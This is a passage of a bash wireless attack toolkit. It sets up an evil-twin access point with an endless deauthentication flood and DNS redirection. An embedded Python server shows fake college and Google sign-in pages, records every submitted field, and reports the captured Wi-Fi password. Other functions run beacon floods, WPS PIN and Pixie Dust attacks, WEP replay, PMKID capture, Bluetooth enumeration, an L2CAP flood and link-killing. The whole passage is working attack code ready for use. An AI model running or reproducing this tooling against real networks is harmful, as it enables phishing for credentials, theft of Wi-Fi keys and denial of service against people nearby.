            bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
    fi

    trap on_interrupt INT
    echo ""
    echo -e "${BOLD}${GREEN}===================================================${NC}"
    echo -e "${BOLD}${GREEN} PHISH RUNNING -- SSID: $TARGET_ESSID${NC}"
    echo -e "${BOLD}${GREEN} Portal: http://$PORTAL_IP/${NC}"
    echo -e "${BOLD}${BLUE} Deauth: $DO_DEAUTH | Internet: $DO_INTERNET${NC}"
    echo -e "${BOLD}${RED} Ctrl+C to STOP and return to menu${NC}"
    echo -e "${BOLD}${GREEN}===================================================${NC}"

    BACK_TO_MENU=0
    while true; do
        if [ "$BACK_TO_MENU" = "1" ]; then
            trap - INT
            BACK_TO_MENU=0
            return
        fi
        sleep 1
    done
}
evil_twin_firmware() {
    print_banner
    ensure_tool aircrack-ng
    do_scan || return
    brand_detect
    echo -e "${BLUE}[+] Brand: $BRAND_NAME${NC}"
    read -p "$(echo -e ${YELLOW}'Handshake .cap (or ENTER to auto-capture): '${NC})" HANDSHAKE_CAP
    if [ -z "$HANDSHAKE_CAP" ] || [ ! -f "$HANDSHAKE_CAP" ]; then
        CAPFILE="$HAND_DIR/hs_${TARGET_ESSID// /_}_$(date +%s)"
        echo -e "${CYAN}[*] Auto-capture starting...${NC}"
        auto_capture_handshake "$CAPFILE"
    fi
    VALID=$(aircrack-ng "$HANDSHAKE_CAP" 2>&1 | grep -E "WPA \([0-9]+ handshake" || true)
    if [ -z "$VALID" ]; then echo -e "${RED}[!] No handshake.${NC}"; pause; return; fi
    echo -e "${GREEN}[+] $VALID${NC}"
    echo -e "${GREEN}[+] Handshake file: $HANDSHAKE_CAP${NC}"
    sleep 1
    evil_twin_firmware_run
}

evil_twin_firmware_run() {
    local PWFILE="$PW_DIR/creds_$(date +%s).txt"
    local VFILE="$PW_DIR/verified_$(date +%s).txt"
    rm -rf /var/www/html; mkdir -p /var/www/html
    touch "$PWFILE" "$VFILE" /var/www/html/creds.txt /var/www/html/verified_creds.txt
    chmod 666 /var/www/html/creds.txt /var/www/html/verified_creds.txt

    if [ -f "$PAGES_DIR/firmware-page.html" ]; then
        cp "$PAGES_DIR/firmware-page.html" /var/www/html/index.html
    elif [ -f $BASE_DIR/evil-page.html ]; then
        cp $BASE_DIR/evil-page.html /var/www/html/index.html
    else
        echo -e "${RED}[!] Missing firmware page.${NC}"; pause; return
    fi
    cp /var/www/html/index.html /tmp/original_page.html

    # if DNS popup-only mode, swap the page for the consent page
    if [ "$DNS_MODE" = "5" ]; then
        cp "$PAGES_DIR/dns-consent.html" /var/www/html/index.html
        cp /var/www/html/index.html /tmp/original_page.html
    fi

    ask_internet_passthrough
    reset_portal_state

    # ensure bits page + logo are always served
    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
    fi
    if [ -f "$PAGES_DIR/google-2step.html" ]; then
        cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    fi

    # ensure bits page + logo are always served
    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
    fi
    if [ -f "$PAGES_DIR/google-2step.html" ]; then
        cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    fi

    dnsspoof_pick_mode

    cat > $HOSTAPD_CONF <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_ESSID
hw_mode=g
channel=$TARGET_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF

    cat > $DNSMASQ_CONF <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
dhcp-option=114,http://$PORTAL_IP:$PORTAL_PORT/
address=/#/$PORTAL_IP
address=/www.msftconnecttest.com/$PORTAL_IP
address=/www.msftncsi.com/$PORTAL_IP
address=/dns.msftncsi.com/$PORTAL_IP
address=/connectivitycheck.gstatic.com/$PORTAL_IP
address=/connectivitycheck.android.com/$PORTAL_IP
address=/clients3.google.com/$PORTAL_IP
address=/clients4.google.com/$PORTAL_IP
address=/captive.apple.com/$PORTAL_IP
address=/detectportal.firefox.com/$PORTAL_IP
address=/dns.google/$PORTAL_IP
address=/dns.google.com/$PORTAL_IP
address=/dns64.dns.google/$PORTAL_IP
address=/cloudflare-dns.com/$PORTAL_IP
address=/mozilla.cloudflare-dns.com/$PORTAL_IP
address=/one.one.one.one/$PORTAL_IP
address=/doh.opendns.com/$PORTAL_IP
address=/dns.quad9.net/$PORTAL_IP
address=/doh.dns.apple.com/$PORTAL_IP
address=/mask.icloud.com/$PORTAL_IP
address=/mask-h2.icloud.com/$PORTAL_IP
address=/use-application-dns.net/$PORTAL_IP
address=/doh.dns.sb/$PORTAL_IP
address=/doh.pub/$PORTAL_IP
address=/dns.alidns.com/$PORTAL_IP
no-resolv
cache-size=0
EOF

    cat > $SERVER_PY <<'PYEOF'
import http.server, socketserver, os, sys, time, urllib.parse

PORT = 80
BIND = "10.0.0.1"
CREDS  = "/var/www/html/creds.txt"
ORIGINAL = "/tmp/original_page.html"

PROBES = [
    "/generate_204", "/gen_204", "/hotspot-detect.html",
    "/library/test/success.html", "/success.txt", "/connecttest.txt",
    "/redirect", "/ncsi.txt", "/canonical.html", "/fwlink", "/wpad.dat",
    "/captiveportal", "/portal", "/mobile/status.php",
    "/kindle-wifi/wifistub.html", "/check_network_status.txt"
]
PH = [
    "connectivitycheck.gstatic.com", "captive.apple.com",
    "www.msftconnecttest.com", "www.msftncsi.com",
    "detectportal.firefox.com", "clients3.google.com",
    "clients4.google.com", "connectivitycheck.android.com",
    "dns.msftncsi.com", "www.gstatic.com"
]

def page():
    try: return open(ORIGINAL, "rb").read()
    except: return b"<html><body>Sign in</body></html>"

CLEARED = set()

class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory="/var/www/html", **k)

    def _log(self, msg):
        try:
            with open(CREDS, "a") as f: f.write(msg + "\n")
        except Exception: pass

    def _serve_file(self, path, ctype="text/html; charset=utf-8"):
        try: d = open(path, "rb").read()
        except Exception: d = b""
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(d)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try: self.wfile.write(d)
        except Exception: pass

    def _redirect(self, dest="http://10.0.0.1/"):
        self.send_response(302)
        self.send_header("Location", dest)
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_GET(self):
        ip = self.client_address[0]
        host = (self.headers.get("Host") or "").lower()
        path = self.path.split("?")[0]

        # explicit page routes
        if path in ("/google-2step.html", "/google-2step", "/google"):
            return self._serve_file("/var/www/html/google-2step.html")
        if path in ("/verified.html", "/verified"):
            try:
                d = open("/var/www/html/verified.html", "rb").read()
            except Exception:
                # full inline fallback — same design as verified.html
                d = """<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">
<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
<title>Account Verified — BITS College</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Arial,sans-serif;
background:#fff;color:#3a3a3a;padding:22px 16px;display:flex;align-items:center;
justify-content:center;min-height:100vh}
.wrap{width:100%;max-width:440px;text-align:center}
h1{font-size:18px;font-weight:400;color:#3a3a3a;margin-bottom:20px}
.notice{background:#f4f9ee;border:1px solid #d9e9c6;color:#3d6b1a;border-radius:6px;
padding:11px 14px;font-size:12.5px;line-height:1.5;margin-bottom:20px;text-align:center}
.card{background:#fff;border:1px solid #e6e6e6;border-radius:6px;padding:30px 24px 26px;
box-shadow:0 1px 3px rgba(0,0,0,.04)}
.badge{width:74px;height:74px;border-radius:50%;background:linear-gradient(135deg,#8bc34a,#6aa536);
display:flex;align-items:center;justify-content:center;margin:0 auto 18px;
box-shadow:0 6px 20px rgba(139,195,74,.35)}
.badge svg{width:36px;height:36px}
.tag{display:inline-block;background:#e8f5e0;color:#2f6b14;padding:5px 14px;border-radius:20px;
font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:16px}
.welcome{font-size:15px;font-weight:600;color:#3a3a3a;margin-bottom:6px}
.email{font-size:12.5px;color:#7a7a7a;margin-bottom:18px}
.email .v{color:#3d6b1a;font-weight:600;font-family:monospace}
.body{font-size:13px;color:#7a7a7a;line-height:1.55;margin-bottom:22px}
.status{font-size:12px;color:#9aa896;margin-top:14px}
.foot{font-size:11px;color:#999;margin-top:22px}
</style></head><body>
<div class=\"wrap\">
<h1>BITS College's Online Application Service</h1>
<div class=\"notice\"><strong>Verification complete.</strong><br>
You now have full access to the lab network.</div>
<div class=\"card\">
<div class=\"badge\"><svg viewBox=\"0 0 24 24\" fill=\"none\">
<path d=\"M5 13l4 4L19 7\" stroke=\"#fff\" stroke-width=\"3\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>
</svg></div>
<div class=\"tag\">&#10003; ACCOUNT VERIFIED</div>
<div class=\"welcome\" id=\"w\">Welcome</div>
<div class=\"email\">Signed in as <span class=\"v\" id=\"em\">your account</span></div>
<p class=\"body\">Your BITS account has been successfully verified.<br>
You may safely close this window to continue.</p>
<div class=\"status\" id=\"st\">Closing automatically&hellip;</div>
</div>
<div class=\"foot\">&copy; BITS College</div>
</div>
<script>
var e='';try{var p=new URLSearchParams(location.search);e=p.get('e')||p.get('email')||'';}catch(_){}
try{e=e||sessionStorage.getItem('bits_email')||'';}catch(_){}
if(e){var l=e.split('@')[0]||'';var ps=l.split(/[._-]/).filter(Boolean);
var n=ps.map(function(x){return x.charAt(0).toUpperCase()+x.slice(1)}).join(' ');
if(n)document.getElementById('w').textContent='Welcome, '+n;
document.getElementById('em').textContent=e;}
setTimeout(function(){try{window.open('','_self').close();}catch(_){}
try{window.close();}catch(_){}
setTimeout(function(){document.getElementById('st').textContent='You may close this window manually.';},300);},2500);
</script></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(d)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            try: self.wfile.write(d)
            except Exception: pass
            return
        if path.startswith("/bits-logo"):
            return self._serve_file("/var/www/html/bits-logo.png", "image/png")
        if path in ("/bits-login.html", "/bits-login"):
            return self._serve_file("/var/www/html/bits-login.html")

        # captive probe check
        is_probe = (
            any(p in self.path for p in PROBES) or
            any(x in host for x in PH)
        )
        if is_probe:
            return self._redirect()

        # static file wins
        fp = self.translate_path(path)
        if os.path.isfile(fp) and path not in ("/", "/index.html"):
            return super().do_GET()

        # landing page
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            d = page()
            self.send_header("Content-Length", str(len(d)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(d)
        except Exception:
            pass

    def do_POST(self):
        ip = self.client_address[0]
        try: n = int(self.headers.get("Content-Length", 0) or 0)
        except Exception: n = 0
        raw = b""
        try: raw = self.rfile.read(n)
        except Exception: pass
        ctype = (self.headers.get("Content-Type") or "").lower()

        # parse body properly
        fields = {}
        try:
            if "application/x-www-form-urlencoded" in ctype:
                fields = {k: v[0] for k, v in urllib.parse.parse_qs(raw.decode("utf-8", "ignore")).items()}
            elif "multipart/form-data" in ctype:
                # crude multipart parser
                boundary = ctype.split("boundary=")[-1].strip('"')
                parts = raw.split(("--" + boundary).encode())
                for part in parts:
                    if b"\r\n\r\n" not in part: continue
                    head, body = part.split(b"\r\n\r\n", 1)
                    body = body.rstrip(b"\r\n-")
                    m = re.search(rb'name="([^"]+)"', head) if False else None
                    # use simple split
                    hs = head.decode("utf-8", "ignore")
                    nm = ""
                    for line in hs.split("\r\n"):
                        if 'name="' in line:
                            nm = line.split('name="', 1)[1].split('"', 1)[0]
                            break
                    if nm:
                        try: fields[nm] = body.decode("utf-8", "ignore")
                        except Exception: fields[nm] = ""
        except Exception as e:
            fields = {"_raw": raw.decode("utf-8", "ignore")[:200], "_err": str(e)}

        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        line = "[%s] %s POST %s -> %s" % (
            ts, ip, self.path,
            " | ".join("%s=%s" % (k, v) for k, v in fields.items()) or "(empty)"
        )
        print("[+] " + line, flush=True)
        self._log(line)

        CLEARED.add(ip)

        # grab email from parsed fields to pass to /verified?e=...
        email = ""
        for key in ("email", "user", "username", "login", "e"):
            if key in fields and fields[key]:
                email = fields[key]
                break
        # URL-encode the email
        import urllib.parse as _up
        eq = _up.quote(email, safe="") if email else ""

        # send a small verified page + JS redirect that carries the email
        redirect = "/verified"
        if eq:
            redirect = "/verified?e=" + eq

        body = (
            '<!DOCTYPE html><html><head><meta charset="utf-8">'
            '<title>Verified</title>'
            '<meta http-equiv="refresh" content="0;url=' + redirect + '">'
            '<script>'
            'try{ if("' + eq + '") sessionStorage.setItem("bits_email",'
            'decodeURIComponent("' + eq + '")); }catch(e){}'
            'window.location.replace("' + redirect + '");'
            '</script>'
            '<style>body{font-family:system-ui;background:#f7faf4;'
            'display:flex;align-items:center;justify-content:center;height:100vh;margin:0}'
            '.c{text-align:center}</style></head>'
            '<body><div class="c"><h2>Verified</h2><p>Redirecting…</p>'
            '</div></body></html>'
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try: self.wfile.write(body)
        except Exception: pass

    def log_message(self, *a): pass

socketserver.TCPServer.allow_reuse_address = True
for _ in range(30):
    try:
        srv = socketserver.TCPServer((BIND, PORT), H)
        break
    except OSError as e:
        print("[!] bind failed:", e, flush=True); time.sleep(1)
else:
    print("[!] could not bind", flush=True); sys.exit(1)
srv.serve_forever()

PYEOF

    export HANDSHAKE_CAP TARGET_BSSID BRAND_NAME

    setup_ap_interfaces || { pause; return; }

    echo -e "${CYAN}[*] Starting dnsmasq...${NC}"
    sudo rm -f /tmp/evil-dnsmasq.log 2>/dev/null; dnsmasq -C $DNSMASQ_CONF --log-queries --log-facility=/tmp/evil-dnsmasq.log >>"$PHOBIA_DEBUG_LOG" 2>&1
    sleep 1
    echo -e "${CYAN}[*] Starting web server...${NC}"
    nohup python3 $SERVER_PY > $SERVER_LOG 2>&1 </dev/null &
    sleep 1

    launch_xterm -bg black -fg '#00ff88' -title "AP STATUS" -geometry $G_AP -e bash -c "tail -f $HOSTAPD_LOG"
    launch_xterm -bg black -fg '#ff5555' -title "DEAUTH (aireplay-ng)" -geometry $G_DEAUTH -e \
        bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
    launch_xterm -bg black -fg '#66aaff' -title "WEB SERVER" -geometry $G_WEB -e bash -c "tail -f $SERVER_LOG"
    launch_xterm -bg black -fg '#ffd700' -title "CREDS" -geometry $G_CREDS -e bash -c "tail -f /var/www/html/creds.txt"
    launch_xterm -bg black -fg '#00ff88' -title "VERIFIED" -geometry $G_VERIFY -e bash -c "tail -f /var/www/html/verified_creds.txt"

    rm -f /tmp/evil_success
    trap on_interrupt INT
    echo ""
    echo -e "${BOLD}${GREEN}========= FIRMWARE RUNNING =========${NC}"
    echo -e "${BOLD}${BLUE} Internet: $DO_INTERNET${NC}"
    echo -e "${BOLD}${RED} Ctrl+C to STOP and return to menu${NC}"

    BACK_TO_MENU=0
    while true; do
        if [ "$BACK_TO_MENU" = "1" ]; then
            trap - INT
            BACK_TO_MENU=0
            return
        fi
        if [ -f /tmp/evil_success ]; then
            local PW
            PW=$(cat /tmp/evil_success)
            echo ""
            echo -e "${BOLD}${GREEN}╔==============================================================╗${NC}"
            echo -e "${BOLD}${GREEN}║                    PASSWORD FOUND !!!                        ║${NC}"
            echo -e "${BOLD}${GREEN}╚==============================================================╝${NC}"
            echo ""
            echo -e "${BOLD}${CYAN}  ┌-----------------------------------------------------------┐${NC}"
            echo -e "${BOLD}${CYAN}  │${NC}  ${BOLD}Password:${NC} ${BOLD}${YELLOW}$PW${NC}"
            echo -e "${BOLD}${CYAN}  └-----------------------------------------------------------┘${NC}"
            echo ""
            echo -e "${BOLD}${CYAN}  ┌-----------------------------------------------------------┐${NC}"
            echo -e "${BOLD}${CYAN}  │${NC}  ${BOLD}All attempts:${NC}"
            echo -e "${BOLD}${CYAN}  ├-----------------------------------------------------------┤${NC}"
            if [ -f "$PWFILE" ]; then
                while IFS= read -r line; do
                    local q
                    q=$(python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "$line" 2>/dev/null)
                    [ -z "$q" ] && q="$line"
                    if [ "$q" = "$PW" ]; then
                        echo -e "${BOLD}${CYAN}  │${NC}  ${GREEN}→ $q${NC}"
                    else
                        echo -e "${BOLD}${CYAN}  │${NC}  ${DIM}$q${NC}"
                    fi
                done < "$PWFILE"
            fi
            echo -e "${BOLD}${CYAN}  └-----------------------------------------------------------┘${NC}"
            echo ""
            cp /tmp/evil_success "$VFILE" 2>/dev/null

            pkill -9 -f hostapd 2>/dev/null
            pkill -9 -f dnsmasq 2>/dev/null
            pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
            pkill -9 -f aireplay-ng 2>/dev/null
            pkill -9 -f airodump-ng 2>/dev/null
            pkill -9 -f xterm 2>/dev/null
            rm -f /tmp/evil_success
            sleep 2

            if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
            if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
            if ip link show "$INTERFACE" >/dev/null 2>&1; then
                ip link set "$INTERFACE" down >/dev/null 2>&1
                iw dev "$INTERFACE" set type managed >/dev/null 2>&1
                ip link set "$INTERFACE" up >/dev/null 2>&1
                ip addr flush dev "$INTERFACE" >/dev/null 2>&1
            fi
            timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
            timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &

            echo -e "${GREEN}[+] Attack stopped. Network restored.${NC}"
            pause
            trap - INT
            BACK_TO_MENU=0
            return
        fi
        sleep 1
    done
}

beacon_flood_single() {
    print_banner
    ensure_tool mdk4
    read -p "$(echo -e ${YELLOW}'Channel [6]: '${NC})" CH; CH="${CH:-6}"
    read -p "$(echo -e ${YELLOW}'SSID: '${NC})" SSIDNAME
    [ -z "$SSIDNAME" ] && echo -e "${RED}[!] No SSID.${NC}" && pause && return
    ensure_monitor_on $CH
    launch_xterm -bg black -fg '#ff5555' -title "BEACON FLOOD" -geometry $G_DEAUTH -e \
        bash -c "mdk4 $MONITOR_ACTUAL b -c $CH -s 1000 -n '$SSIDNAME'; echo; echo '>>> ended'; read"
    wait_xterm_done
}

beacon_flood_multi() {
    print_banner
    ensure_tool mdk4
    read -p "$(echo -e ${YELLOW}'Channel [6]: '${NC})" CH; CH="${CH:-6}"
    read -p "$(echo -e ${YELLOW}'How many SSIDs? '${NC})" N
    if [[ ! "$N" =~ ^[0-9]+$ ]] || [ "$N" -lt 1 ]; then echo -e "${RED}[!] invalid${NC}"; pause; return; fi
    local names=(); local i
    for i in $(seq 1 $N); do read -p "$(echo -e ${YELLOW}"SSID #$i: "${NC})" ONE; names+=("$ONE"); done
    ensure_monitor_on $CH
    local LISTFILE="/tmp/mdk4_ssids.txt"; : > "$LISTFILE"
    for one in "${names[@]}"; do echo "$one" >> "$LISTFILE"; done
    launch_xterm -bg black -fg '#ff5555' -title "BEACON FLOOD $N" -geometry $G_DEAUTH -e \
        bash -c "mdk4 $MONITOR_ACTUAL b -c $CH -s 1000 -f $LISTFILE; echo; echo '>>> ended'; read"
    wait_xterm_done
}

hs_capture() {
    local OUT="$HAND_DIR/hs_${TARGET_ESSID// /_}_$(date +%s)"
    auto_capture_handshake "$OUT"; pause
}

hs_pmkid() {
    ensure_tool hcxdumptool
    command -v hcxdumptool >/dev/null || { echo -e "${RED}[!] install hcxdumptool failed${NC}"; pause; return; }
    OUTFILE="$PMK_DIR/pmkid_${TARGET_ESSID// /_}_$(date +%s)"
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#66aaff' -title "HCXDUMPTOOL" -geometry $G_DEAUTH -e \
        bash -c "hcxdumptool -i $MONITOR_ACTUAL -o $OUTFILE.pcapng --enable_status=1; echo; echo '>>> ended'; read"
    wait_xterm_done
}

hs_decloak() {
    OUTFILE="$HAND_DIR/decloak_$(date +%s)"
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#66aaff' -title "DECLOAK" -geometry $G_DEAUTH -e \
        bash -c "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $OUTFILE $MONITOR_ACTUAL"
    wait_xterm_done
}

wep_capture() {
    OF="$HAND_DIR/wep_${TARGET_ESSID// /_}_$(date +%s)"
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#cc66ff' -title "WEP CAPTURE" -geometry $G_DEAUTH -e \
        bash -c "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $OF $MONITOR_ACTUAL"
    wait_xterm_done
}

wep_arp() {
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#ff5555' -title "ARP REPLAY" -geometry $G_DEAUTH -e \
        bash -c "aireplay-ng --arpreplay -b $TARGET_BSSID $MONITOR_ACTUAL"
    wait_xterm_done
}

wps_scan() {
    ensure_tool wash reaver
    command -v wash >/dev/null || { echo -e "${RED}[!] install reaver failed${NC}"; pause; return; }
    ensure_monitor_on 6
    launch_xterm -bg black -fg '#cc66ff' -title "WASH" -geometry $G_DEAUTH -e \
        bash -c "wash -i $MONITOR_ACTUAL"
    wait_xterm_done
}

wps_pixie() {
    ensure_tool reaver
    do_scan || { pause; return; }
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#cc66ff' -title "PIXIE DUST" -geometry $G_DEAUTH -e \
        bash -c "reaver -i $MONITOR_ACTUAL -b $TARGET_BSSID -c $TARGET_CHANNEL -K 1 -vv -N"
    wait_xterm_done
}

wps_pin() {
    ensure_tool reaver
    do_scan || { pause; return; }
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#cc66ff' -title "WPS PIN" -geometry $G_DEAUTH -e \
        bash -c "reaver -i $MONITOR_ACTUAL -b $TARGET_BSSID -c $TARGET_CHANNEL -vv -L -N -d 15"
    wait_xterm_done
}

BT_HISTORY="$BASE_DIR/bt_history.txt"

bt_save_history() {
    [ -z "$1" ] && return
    mkdir -p "$(dirname "$BT_HISTORY")"
    if [ -f "$BT_HISTORY" ] && grep -q "^$1 " "$BT_HISTORY"; then return; fi
    local name="${2:-<unknown>}"
    printf "%s %s %s\n" "$1" "$name" "$(date '+%Y-%m-%d %H:%M')" >> "$BT_HISTORY"
}

bt_show_history() {
    [ ! -f "$BT_HISTORY" ] && return
    echo ""
    echo -e "${BOLD}${MAGENTA}--------- SCAN HISTORY ---------${NC}"
    printf "  ${BOLD}%-4s %-22s %-24s %s${NC}\n" "No." "MAC" "NAME" "WHEN"
    echo -e "${MAGENTA}  ------------------------------------------------------------${NC}"
    local n=1
    while read -r mac name when; do
        printf "  ${BOLD}%-4s${NC} ${YELLOW}%-22s${NC} ${GREEN}%-24s${NC} ${DIM}%s${NC}\n" "$n" "$mac" "$name" "$when"
        eval "BT_HIST_$n=\"$mac\""
        n=$((n+1))
    done < "$BT_HISTORY" | tail -20
    echo -e "${MAGENTA}  ------------------------------------------------------------${NC}"
    echo -e "${DIM}    Type a number to reuse, or the MAC manually, or blank to skip.${NC}"
}

bt_show_target() {
    local label="${1:-TARGET}"
    echo ""
    echo -e "${BOLD}${CYAN}╔========================================================╗"
    printf  "${BOLD}${CYAN}║${NC}  %-12s ${BOLD}${YELLOW}%-34s${NC} ${BOLD}${CYAN}║${NC}\n" "$label:" "$BT_MAC"
    echo -e "${BOLD}${CYAN}╚========================================================╝${NC}"
    echo ""
}

bt_scan_services() {
    print_banner
    ensure_tool sdptool bluez
    echo -e "${BOLD}${BLUE}========= FULL SERVICE DUMP =========${NC}"
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    sudo sdptool browse "$BT_MAC" 2>/dev/null
    echo ""
    pause
}

bt_sdp() {
    print_banner
    ensure_tool sdptool bluez
    echo -e "${BOLD}${BLUE}========= SDP ENUMERATION =========${NC}"
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    sudo sdptool browse "$BT_MAC" 2>/dev/null | grep -E "Service Name|Service RecHandle|Protocol Descriptor|Channel" | sed 's/^/  /'
    echo ""
    pause
}

bt_rfcomm_scan() {
    print_banner
    ensure_tool rfcomm bluez
    echo -e "${BOLD}${BLUE}========= RFCOMM CHANNEL SCAN =========${NC}"
    echo -e "${DIM}    Slow scan — 3s between probes (avoids phone-side rate limit).${NC}"
    echo ""
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    echo -e "${YELLOW}[!] Probe scan — Press Ctrl+C to stop early.${NC}"
    echo ""
    local CHANNELS="1 2 3 8 9 10 13 14 15 16 17 22 23 24 25 26 27"
    local ch=0
    local open_count=0
    for ch in $CHANNELS; do
        sudo rfcomm release rfcomm0 >/dev/null 2>&1
        sleep 1
        out=$(sudo timeout 3 rfcomm connect rfcomm0 "$BT_MAC" "$ch" 2>&1)
        if echo "$out" | grep -qi "Connected"; then
            printf "  ${GREEN}[open]${NC} channel %s\n" "$ch"
            open_count=$((open_count+1))
        else
            printf "  ${DIM}[----]${NC} channel %s\n" "$ch"
        fi
        sudo rfcomm release rfcomm0 >/dev/null 2>&1
        sleep 2
    done
    echo ""
    echo -e "${CYAN}    $open_count open channels${NC}"
    pause
}

bt_hid_probe() {
    print_banner
    ensure_tool sdptool bluez
    echo -e "${BOLD}${MAGENTA}========= HID / INPUT DEVICE PROBE =========${NC}"
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    sudo sdptool search --bdaddr "$BT_MAC" HID 2>/dev/null
    sudo sdptool search --bdaddr "$BT_MAC" HIDKeyboard 2>/dev/null
    echo ""
    pause
}

bt_audio_probe() {
    print_banner
    ensure_tool sdptool bluez
    echo -e "${BOLD}${MAGENTA}========= A2DP / HEADSET PROBE =========${NC}"
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    sudo sdptool search --bdaddr "$BT_MAC" AudioSource 2>/dev/null
    sudo sdptool search --bdaddr "$BT_MAC" Headset 2>/dev/null
    echo ""
    pause
}

bt_l2cap_flood() {
    print_banner
    ensure_tool l2ping bluez
    echo -e "${BOLD}${RED}========= L2CAP FLOOD (DoS) =========${NC}"
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    read -p "$(echo -e ${YELLOW}'Packet size [600]: '${NC})" BT_SIZE
    BT_SIZE="${BT_SIZE:-600}"
    read -p "$(echo -e ${YELLOW}'Threads [10]: '${NC})" BT_THREADS
    BT_THREADS="${BT_THREADS:-10}"
    echo ""
    echo -e "${CYAN}[*] Flooding, ${BT_SIZE}B x ${BT_THREADS} threads, 60s...${NC}"
    echo ""
    local i=0
    for ((i=0;i<BT_THREADS;i++)); do
        timeout 60 sudo l2ping -i "$BT_IF" -s "$BT_SIZE" -f "$BT_MAC" >/dev/null 2>&1 &
    done
    sleep 60
    sudo pkill -f l2ping 2>/dev/null
    echo -e "${GREEN}[+] Done.${NC}"
    pause
}

bt_kill_link() {
    print_banner
    ensure_tool hcitool bluez
    echo -e "${BOLD}${RED}========= KILL BT LINK =========${NC}"
    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return
    bt_show_target
    sudo hcitool dc "$BT_MAC" 2>/dev/null && echo -e "${GREEN}[+] Disconnect issued${NC}"
    echo ""
    pause
}
bt_adv_spam() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= BLE ADVERTISING SPAM =========${NC}"
    echo -e "${DIM}    Requires ESP32-WROOM-32 with Marauder/Bruce.${NC}"
    echo ""
    ensure_tool esptool.py esptool

    local PORT=""
    for p in /dev/ttyUSB0 /dev/ttyUSB1 /dev/ttyACM0 /dev/ttyACM1; do
        [ -e "$p" ] && PORT="$p" && break
    done

    if [ -z "$PORT" ]; then
        echo -e "${YELLOW}[!] No ESP32 detected on any serial port.${NC}"
        echo -e "${DIM}    Plug in ESP32-WROOM-32 via USB and try again.${NC}"
        echo -e "${DIM}    Firmware to flash: Marauder or Bruce (BLE spam mode)${NC}"
        pause
        return
    fi

    echo -e "${GREEN}[+] ESP32 detected on $PORT${NC}"
    echo ""
